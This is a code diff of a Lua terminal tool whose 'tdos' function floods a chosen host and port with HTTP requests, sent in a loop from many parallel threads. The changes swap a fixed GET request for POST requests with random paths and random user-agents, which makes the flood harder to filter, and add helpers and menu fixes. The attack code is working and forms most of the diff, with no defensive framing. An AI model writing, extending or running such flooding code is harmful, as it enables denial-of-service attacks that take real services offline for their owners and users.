@@ -86,6 +86,7 @@ local prettytext = require("prettytext")
 local socket = require('socket')
 local useragent = require("useragent")
 local lanes = require("lanes").configure()
+local charf = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
 local activelanes = {}
 local branding = [[
                    _                                     
@@ -107,11 +108,21 @@ end
 
 local function exit() -- exit and clean up
     colord:reset()
+    colord:cursorsethome()
     colord:erasesavedL()
     colord:eraseall()
     io.write(colord:cursorvis())
     collectgarbage("collect")
     os.exit()
+end
+
+local function randchar(leng)
+    local res = ""
+    for i = 1, leng do
+        local rand_index = math.random(1, string.len(charf))
+        res = res .. string.sub(charf, rand_index, rand_index)
+    end
+    return res
 end
 
 -- ================================voids=================================
@@ -152,6 +163,7 @@ local function tdos()
             if config.useproxies then
                 print("proxies")
             else
+
                 for i = 1, config.MAXTASK do --allocate
                     activelanes[i] = lanes.gen("*", function()
                                         local socket = require("socket")
@@ -159,7 +171,7 @@ local function tdos()
                                         for i = 1, 10 do
                                             local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
                                             colord:curtosaveDEC()
-                                            tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
+                                            tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(inputhost), tonumber(inputport)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
                                             tcp:close()
                                             colord:curtosaveDEC()
                                             io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",inputhost,inputport,count))
@@ -183,7 +195,8 @@ local function tdos()
                 else
                     for i = 1, 10 do
                         local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
-                        tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
+                        colord:curtosaveDEC()
+                        tcp:send("POST "..tostring(randchar(config.packetsize)).." HTTP/1.1\r\n" .. "Host: " .. string.format("%s:%d", tostring(inputhost), tonumber(inputport)) .. "\r\n" .. "User-Agent: " .. useragent.ua[math.random(1, #useragent.ua)] .. "\r\nConnection: close\r\n\r\n")
                         tcp:close()
                         colord:curtosaveDEC()
                         io.write(string.format(colord:eraseinline().."send to %s:%d times: %d",inputhost,inputport,count))
@@ -232,8 +245,8 @@ local function tui()
         local idn = {} -- this would dynamically list choice
         for i, v in pairs(tchoice) do --choice (tui)
             io.write(string.format("    "..colord:b256setcolor(218,"fg").."%d : "..colord:b256setcolor(218,"fg").."%s   "..colord:reset().."-"..colord:b256setcolor(218,"fg").."   %s\n"..colord:reset(),count,i,v))
-            count = count + 1
             table.insert(idn,i)
+            count = count + 1
         end
         io.write(colord:b256setcolor(213,"fg").."choice : "..colord:reset())
         local input = io.read()
@@ -243,7 +256,7 @@ local function tui()
             warn("out of range.\n")
         elseif tonumber(input) == 0 then
             warn("the list start with 1")
-        else
+        elseif justrun[idn[tonumber(input)]] then
             justrun[idn[tonumber(input)]].run()
         end
     end
